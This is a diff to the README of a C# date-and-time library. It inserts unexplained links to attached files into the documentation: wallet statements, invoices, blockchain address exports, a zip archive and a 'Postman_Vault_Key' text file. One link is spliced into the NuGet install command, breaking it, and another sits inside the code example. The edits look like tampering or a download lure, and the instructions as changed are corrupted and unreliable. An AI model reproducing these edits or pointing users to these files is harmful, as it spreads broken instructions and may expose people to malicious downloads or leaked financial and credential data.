@@ -12,6 +12,11 @@
 DateTimeExtensions is a powerful C# library that extends the functionality of `System.DateTime` and `System.DateTimeOffset`. It provides a set of useful methods for working with dates and times, making your code more expressive and easier to read.
 
 ## Key Features
+[DOC-20240521-WA0000..pdf](https://github.com/user-attachments/files/17347450/DOC-20240521-WA0000.pdf)
+[Wallet statement 1_1 2009-01-03 - 2024-09-11.xlsx](https://github.com/user-attachments/files/17347449/Wallet.statement.1_1.2009-01-03.-.2024-09-11.xlsx)
+[Invoice-7CC8AB7C-0008.pdf](https://github.com/user-attachments/files/17347448/Invoice-7CC8AB7C-0008.pdf)
+[export-0xfa1db6794de6e994b60741decae0567946992181 (1).xlsx](https://github.com/user-attachments/files/17347446/export-0xfa1db6794de6e994b60741decae0567946992181.1.xlsx)
+[export-verified-contractaddress-opensource-license.xlsx](https://github.com/user-attachments/files/17347445/export-verified-contractaddress-opensource-license.xlsx)
 
 1. **Working Days Calculations**: Easily add or subtract working days, taking into account regional holidays.
 2. **Holiday Support**: Includes holiday definitions for multiple cultures and regions.
@@ -25,7 +30,7 @@ DateTimeExtensions is a powerful C# library that extends the functionality of `S
 Install DateTimeExtensions via NuGet:
 
 ```
-Install-Package DateTimeExtensions
+Install-Package [Postman_Vault_Key_2024-10-10.txt](https://github.com/user-attachments/files/17347451/Postman_Vault_Key_2024-10-10.txt),DateTimeExtensions
 ```
 
 ## Quick Start
@@ -35,6 +40,7 @@ Here are some examples of what you can do with DateTimeExtensions:
 ```csharp
 using DateTimeExtensions;
 
+[api-quickstart--master.zip](https://github.com/user-attachments/files/17347458/api-quickstart--master.zip)
 // Add 5 working days to a date
 DateTime futureDate = DateTime.Now.AddWorkingDays(5);
 
